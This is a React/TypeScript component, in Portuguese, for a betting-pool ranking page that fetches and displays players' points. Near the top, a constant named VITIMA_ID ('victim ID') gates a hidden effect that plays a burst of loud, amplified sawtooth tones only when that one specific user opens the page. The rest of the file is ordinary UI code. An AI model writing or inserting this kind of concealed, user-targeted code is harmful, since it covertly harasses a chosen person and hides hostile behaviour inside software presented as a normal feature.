import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { api } from "../services/api";
import type { RankingEntry } from "../types/api";
import { useAuth } from "../contexts/AuthContext";

const VITIMA_ID = "70e7b4e7-742f-40be-a095-673f37bfee3c";

export function Ranking() {
  const navigate = useNavigate();
  const { user } = useAuth();
  const [jogadores, setJogadores] = useState<RankingEntry[]>([]);
  const [carregando, setCarregando] = useState(true);

  useEffect(() => {
    if (user?.id !== VITIMA_ID) return;
    const ctx = new AudioContext();
    const gain = ctx.createGain();
    gain.gain.value = 5;
    gain.connect(ctx.destination);
    [0, 0.25, 0.5, 0.75, 1.0, 1.25, 1.5].forEach((delay) => {
      const osc = ctx.createOscillator();
      osc.type = "sawtooth";
      osc.frequency.value = delay % 0.5 === 0 ? 1200 : 880;
      osc.connect(gain);
      osc.start(ctx.currentTime + delay);
      osc.stop(ctx.currentTime + delay + 0.22);
    });
    return () => { ctx.close(); };
  }, [user]);

  useEffect(() => {
    const cached = sessionStorage.getItem("bolao:ranking");
    if (cached) {
      setJogadores(JSON.parse(cached));
      setCarregando(false);
    }

    api
      .get<RankingEntry[]>("/ranking")
      .then((res) => {
        sessionStorage.setItem("bolao:ranking", JSON.stringify(res.data));
        setJogadores(res.data);
      })
      .catch(console.error)
      .finally(() => setCarregando(false));
  }, []);

  return (
    <div className='min-h-screen bg-gray-50 p-6'>
      <div className='max-w-2xl mx-auto'>
        <div className='flex justify-between items-center mb-8'>
          <h1 className='text-3xl font-black text-gray-800 tracking-tight'>
            🏆 Ranking Geral
          </h1>
          <button
            onClick={() => navigate("/dashboard")}
            className='text-blue-600 font-bold hover:underline'
          >
            Voltar aos Jogos
          </button>
        </div>

        {carregando ? (
          <div className='bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden animate-pulse'>
            {[1, 2, 3, 4, 5].map((i) => (
              <div key={i} className='flex items-center justify-between p-5 border-b border-gray-100'>
                <div className='flex items-center gap-4'>
                  <div className='w-10 h-10 bg-gray-200 rounded-full' />
                  <div className='h-4 bg-gray-200 rounded w-32' />
                </div>
                <div className='h-8 bg-gray-200 rounded w-16' />
              </div>
            ))}
          </div>
        ) : jogadores.length === 0 ? (
          <div className='bg-white rounded-2xl shadow-xl border border-gray-100 p-12 text-center text-gray-400 font-semibold'>
            Nenhum palpite pontuado ainda. Aguarde os resultados dos jogos!
          </div>
        ) : (
          <div className='bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden flex flex-col'>
            {jogadores.map((jogador, index) => {
              const posicao = index + 1;
              let estiloPosicao = "bg-gray-100 text-gray-600 font-bold";
              if (posicao === 1)
                estiloPosicao =
                  "bg-yellow-100 text-yellow-700 font-black border-2 border-yellow-400";
              if (posicao === 2)
                estiloPosicao =
                  "bg-gray-200 text-gray-700 font-black border-2 border-gray-400";
              if (posicao === 3)
                estiloPosicao =
                  "bg-orange-100 text-orange-800 font-black border-2 border-orange-400";

              return (
                <div
                  key={jogador.userId}
                  className='flex items-center justify-between p-5 border-b border-gray-100 last:border-0 hover:bg-gray-50 transition-colors'
                >
                  <div className='flex items-center gap-4'>
                    <div
                      className={`w-10 h-10 flex items-center justify-center rounded-full ${estiloPosicao}`}
                    >
                      {posicao}º
                    </div>
                    <span className='font-bold text-gray-800 text-lg'>
                      {jogador.displayName}
                    </span>
                  </div>

                  <div className='text-right'>
                    <span className='text-2xl font-black text-blue-600'>
                      {jogador.points}
                    </span>
                    <span className='text-xs text-gray-500 block uppercase tracking-wider font-bold'>
                      pontos
                    </span>
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
}
